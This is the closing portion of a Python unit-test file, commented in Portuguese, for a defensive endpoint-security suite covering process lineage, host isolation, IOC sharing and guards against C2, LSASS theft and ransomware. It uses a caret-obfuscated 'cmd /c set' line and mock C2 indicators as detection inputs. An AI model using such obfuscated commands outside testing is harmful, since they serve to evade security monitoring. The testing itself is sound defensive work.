        self.assertGreaterEqual(obf_b64["score"], 0.40)

        # 2. Árvore de Processos e Linhagem Forense
        edr = EDRProcessGuard()
        tree = edr.get_process_tree(mode="all")
        self.assertEqual(tree["status"], "success")
        self.assertGreaterEqual(len(tree["nodes"]), 1)

        lineage = edr.get_process_lineage(os.getpid())
        self.assertEqual(lineage["status"], "success")
        self.assertEqual(lineage["target"]["pid"], os.getpid())
        self.assertGreaterEqual(lineage["lineage_depth"], 1)

        # 3. Isolamento Granular com Canal de Gestão Preservado
        ztna_wfp = ZeroTrustNetworkEngine()
        ztna_wfp.configure_management_channel(ips=["127.0.0.1"], ports=[5000, 8000])
        res_iso = ztna_wfp.isolate_host_granular(reason="Teste SOC", preserve_management=True)
        self.assertTrue(res_iso["host_isolated"])
        self.assertTrue(res_iso["preserve_management"])

        # Tráfego na porta de gestão 5000 deve ser PERMITIDO
        mgmt_pkt = ztna_wfp.inspect_packet("127.0.0.1", "127.0.0.1", 5000, "python.exe")
        self.assertEqual(mgmt_pkt["action"], "ALLOW")
        self.assertEqual(mgmt_pkt["bypass_reason"], "MANAGEMENT_CHANNEL_PRESERVED")

        # Tráfego normal na porta 445 deve ser BLOQUEADO pelo isolamento
        blocked_pkt = ztna_wfp.inspect_packet("10.0.0.5", "192.168.1.50", 445, "powershell.exe")
        self.assertEqual(blocked_pkt["action"], "BLOCK")
        self.assertEqual(blocked_pkt["reason"], "HOST_UNDER_EMERGENCY_ISOLATION")

        # 4. Defesa Colaborativa Distribuída (Broadcast de IOCs)
        cfg = MultiAgentConfig(agent_id="test-node-alpha", role="agent", hub_url="http://127.0.0.1:5000")
        client = MultiAgentClient(cfg)
        b_res = client.broadcast_threat_ioc("ip", "198.51.100.99", severity="CRITICAL", reason="C2 Ativo")
        self.assertEqual(b_res["status"], "success")
        self.assertEqual(b_res["ioc"]["value"], "198.51.100.99")

        # 5. Validação dos Endpoints REST
        with flask_api_app.test_client() as api_client:
            r_tree = api_client.get("/api/edr/process-tree")
            self.assertEqual(r_tree.status_code, 200)

            r_lin = api_client.get(f"/api/edr/process/{os.getpid()}/lineage")
            self.assertEqual(r_lin.status_code, 200)

            r_obf = api_client.post("/api/ai/command-analysis", json={"cmdline": "c^m^d /c s^e^t"})
            self.assertEqual(r_obf.status_code, 200)
            self.assertIn("analysis", r_obf.get_json())

            r_ioc = api_client.post("/api/multiagent/broadcast-ioc", json={"ioc_type": "ip", "value": "203.0.113.88", "reason": "Teste"})
            self.assertEqual(r_ioc.status_code, 200)

            r_gran = api_client.post("/api/ztna/granular-isolation", json={"reason": "Broca de Teste SOC", "preserve_management": True})
            self.assertEqual(r_gran.status_code, 200)

    def test_11_audit_and_service_orchestration_suite(self):
        """Audita e valida a sincronização de todos os motores soberanos no ThreatWatchdog, Service e API."""
        from sentinel_core.threat_watchdog_daemon import ThreatWatchdogDaemon
        from sentinel_core.c2_beacon_hunter import C2BeaconHunter
        from sentinel_core.byovd_guard import BYOVDGuard
        from sentinel_core.anti_hollowing_guard import AntiHollowingGuard
        from sentinel_core.lsass_guard import LSASSArmorGuard
        from sentinel_core.memory_rwx_hunter import MemoryRWXHunter
        from sentinel_core.ransomware_honeyfiles import RansomwareHoneyfiles
        from sentinel_core.stix_misp_engine import STIXMISPEngine
        from sentinel_core.ransomware_vss_shield import RansomwareVSSShield
        from sentinel_core.amsi_guard import AMSIScriptGuard
        from sentinel_api import init_api
        import sentinel_api

        # 1. Validação do ThreatWatchdogDaemon com todos os 10 passos integrados
        logger = SecurityEventLogger()
        rwx = MemoryRWXHunter(logger_instance=logger)
        stix = STIXMISPEngine(logger_instance=logger)
        vss = RansomwareVSSShield(logger_instance=logger)
        amsi = AMSIScriptGuard(logger_instance=logger)
        c2 = C2BeaconHunter(logger_instance=logger)
        byovd = BYOVDGuard(logger_instance=logger)
        hollow = AntiHollowingGuard(logger_instance=logger)
        lsass = LSASSArmorGuard(logger_instance=logger)
        honey = RansomwareHoneyfiles(logger_instance=logger)

        watchdog = ThreatWatchdogDaemon(
            rwx_hunter=rwx,
            stix_engine=stix,
            vss_shield=vss,
            amsi_guard=amsi,
            c2_hunter=c2,
            byovd_guard=byovd,
            anti_hollowing_guard=hollow,
            lsass_guard=lsass,
            honeyfiles_guard=honey
        )
        self.assertIsNotNone(watchdog.c2_hunter)
        self.assertIsNotNone(watchdog.byovd_guard)
        self.assertIsNotNone(watchdog.anti_hollowing_guard)
        self.assertIsNotNone(watchdog.lsass_guard)

        # Executa ciclo completo de auditoria
        cycle_res = watchdog.execute_single_cycle()
        self.assertEqual(cycle_res["status"], "success")
        self.assertEqual(cycle_res["cycle"], 1)
        self.assertIn("findings_count", cycle_res)

        # 2. Validação individual dos métodos de auditoria
        c2_res = c2.analyze_beaconing_patterns()
        self.assertIsInstance(c2_res, list)

        hollow_res = hollow.scan_system_processes_integrity()
        self.assertIsInstance(hollow_res, list)

        lsass_res = lsass.audit_lsass_access()
        self.assertIsInstance(lsass_res, list)

        byovd_res = byovd.audit_installed_services_registry()
        self.assertIsInstance(byovd_res, list)

        # 3. Validação do contrato de injeção init_api
        init_api(
            byovd_guard=byovd,
            anti_hollowing_guard=hollow,
            lsass_guard=lsass,
            rwx_hunter=rwx,
            honeyfiles_guard=honey
        )
        self.assertEqual(sentinel_api.byovd_guard_instance, byovd)
        self.assertEqual(sentinel_api.anti_hollowing_instance, hollow)
        self.assertEqual(sentinel_api.lsass_guard_instance, lsass)
        self.assertEqual(sentinel_api.rwx_hunter_instance, rwx)
        self.assertEqual(sentinel_api.honeyfiles_guard_instance, honey)

        # 4. Validação da inicialização do SentinelBackgroundDaemon
        from sentinela_service import SentinelBackgroundDaemon
        daemon = SentinelBackgroundDaemon()
        self.assertFalse(daemon.is_running)
        self.assertIsNotNone(daemon.watchdog)


if __name__ == "__main__":
    unittest.main()
